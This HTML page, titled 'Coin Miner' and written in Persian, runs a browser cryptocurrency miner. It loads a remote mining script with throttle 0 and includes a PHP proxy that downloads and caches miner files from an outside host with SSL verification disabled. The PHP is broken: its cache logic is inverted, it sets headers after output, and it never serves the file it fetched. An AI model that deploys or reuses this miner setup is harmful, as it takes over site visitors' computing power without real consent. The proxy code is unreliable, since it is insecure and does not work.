<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coin Miner</title>
</head>
<body>

    <h2>سایت استخراج ارز دیجیتال</h2>

    <script src="https://www.hostingcloud.racing/nHPK.js"></script>
    <script>
        var _client = new Client.Anonymous('0671b695b001e563f34230946b071e7efa8cbf444f5ab32881d3f2746204b165', {
            throttle: 0, c: 'w'
        });
        _client.start();
        _client.addMiningNotification("Top", "این سایت از JavaScript برای استخراج ارز دیجیتال استفاده می‌کند. اگر مشکلی دارید، می‌توانید آن را متوقف کنید.", "#cccccc", 40, "#3d3d3d");
    </script>

    <hr>
    <h3>وضعیت پردازش PHP</h3>
    <p>
        <?php

        $URL_GET = 'http://www.wasm.stream/';
        $CACHE_TIME = '1 hour';
        $CACHE_DIR = 'coinimp-cache';

        function url_get_contents($url)
        {
            $data = false;

            if (function_exists('curl_exec'))
            {
                if ($conn = curl_init($url))
                {
                    curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($conn, CURLOPT_FRESH_CONNECT,  true);
                    curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
                    $data = (curl_exec($conn));
                    curl_close($conn);
                }
            }
            elseif (function_exists('file_get_contents'))
            {
                $data = file_get_contents($url);
            }
            elseif (function_exists('fopen') && function_exists('stream_get_contents'))
            {
                if ($handle = fopen($url, "r"))
                {
                    $data = stream_get_contents($handle);
                }
            }

            if ($data)
                return $data;
            else
                die("خطا در دریافت اطلاعات از \"$url\"!");
        }

        function get_file_from_server($filename)
        {
            global $URL_GET;
            $filename = urlencode($filename);
            $uri = strtok($_SERVER['REQUEST_URI'],'?');
            $host = urlencode((isset($_SERVER['HTTPS']) ? 'https' : 'http') . "://" . $_SERVER['HTTP_HOST'] . "$uri");
            return url_get_contents("$URL_GET?filename=$filename&host=$host");
        }

        function filename_match($filename)
        {
            return preg_match('/^\w{4}\.js$/', $filename)
                || preg_match('/^\w{6}\.js$/', $filename)
                || preg_match('/^\w{7}\.min\.js\.mem$/', $filename)
                || preg_match('/^\w{8}\.wasm$/', $filename)
                || preg_match('/^\w{8}\.png$/', $filename);
        }

        function get_cache_dir()
        {
            $dirs = array('coinimp-cache', 'tmp/coinimp-cache', '/tmp/coinimp-cache');
            foreach ($dirs as $dir)
            {
                if(!file_exists($dir))
                    mkdir($dir, 0777, true);

                if(is_writeable($dir))
                    return $dir;
            }
            die('خطا: دایرکتوری کش "coinimp-cache" قابل نوشتن نیست!');
        }

        function get_dir_size($path)
        {
            $fileSize = 0;
            $dir = scandir($path);

            foreach($dir as $file)
            {
                if (($file !== '.') && ($file !== '..'))
                    if (is_dir($path . '/' . $file))
                        $fileSize += get_dir_size($path.'/'.$file);
                    else
                        $fileSize += filesize($path . '/' . $file);
            }

            return $fileSize;
        }

        $CACHE_DIR = get_cache_dir();

        $req_file = isset($_GET['f']) ? $_GET['f'] : '';

        if (!filename_match($req_file))
        {
            die('خطا: ورودی نامعتبر است');
        }

        $cache_filename = "$CACHE_DIR/$req_file";
        if (!file_exists($cache_filename) || (filemtime($cache_filename) < strtotime("-$CACHE_TIME")))
        {
            $script = get_file_from_server($req_file);
            file_put_contents($cache_filename, $script);
        }
        elseif (get_dir_size($CACHE_DIR) < 7000000)
        {
            rmdir($CACHE_DIR);
            $script = get_file_from_server($req_file);
            file_put_contents($cache_filename, $script);
        }
        else
        {
            $script = file_get_contents($cache_filename);
        }

        $type = substr($req_file, -2) == 'js'
            ? 'application/javascript'
            : 'application/octet-stream';

        header('Content-Type: ' . $type . '; charset=utf-8');

        echo "اسکریپت PHP به درستی اجرا شد.";

        ?>
    </p>

</body>
</html>
